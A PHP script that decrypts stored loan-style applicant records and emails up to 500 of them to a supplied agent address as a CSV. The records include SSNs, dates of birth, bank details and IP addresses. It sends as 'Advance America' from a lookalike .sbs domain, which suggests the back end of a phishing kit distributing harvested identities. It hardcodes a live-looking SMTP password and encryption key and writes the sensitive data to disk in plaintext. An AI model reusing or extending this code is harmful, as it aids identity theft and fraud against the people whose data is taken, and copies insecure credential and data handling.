<?php
session_start();
use PHPMailer\PHPMailer\PHPMailer;

require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';

$encryption_key = 'my_strong_encryption_key';

function decryptData($data, $key) {
    $data = base64_decode($data);
    $ivlen = openssl_cipher_iv_length("AES-256-CBC");
    $iv = substr($data, 0, $ivlen);
    $ciphertext = substr($data, $ivlen);
    return openssl_decrypt($ciphertext, "AES-256-CBC", $key, 0, $iv);
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    die("Access denied.");
}

$agent_email = $_POST['agent_email'];
$ids = $_POST['lead_ids'] ?? [];

if (!$agent_email || empty($ids)) {
    die("No data selected.");
}

if (count($ids) > 500) {
    die("Max 500 leads per email.");
}

$rows = file("submissions.csv.enc");
$csv = "Amount,Name,Email,Address,City,State,Zip,Phone,DOB,SSN,Bank,Years,AppID,Date,IP,Location\n";

foreach ($ids as $id) {
    $dec = decryptData(trim($rows[$id]), $encryption_key);
    if ($dec) $csv .= $dec;
}

file_put_contents("assigned.csv", $csv);

// Send CSV to agent
$mail = new PHPMailer(true);
$mail->isSMTP();
$mail->Host = 'smtp.hostinger.com';
$mail->SMTPAuth = true;
$mail->Username = 'thankyou@advanceamerica.sbs';
$mail->Password = 'Good0055@@';
$mail->SMTPSecure = 'ssl';
$mail->Port = 465;
$mail->setFrom('thankyou@advanceamerica.sbs', 'Advance America');
$mail->addAddress($agent_email);
$mail->Subject = 'Assigned Leads';
$mail->Body = 'Please find assigned leads in the attached CSV file.';
$mail->addAttachment("assigned.csv");
$mail->send();

echo "Sent successfully to " . htmlspecialchars($agent_email);
?>
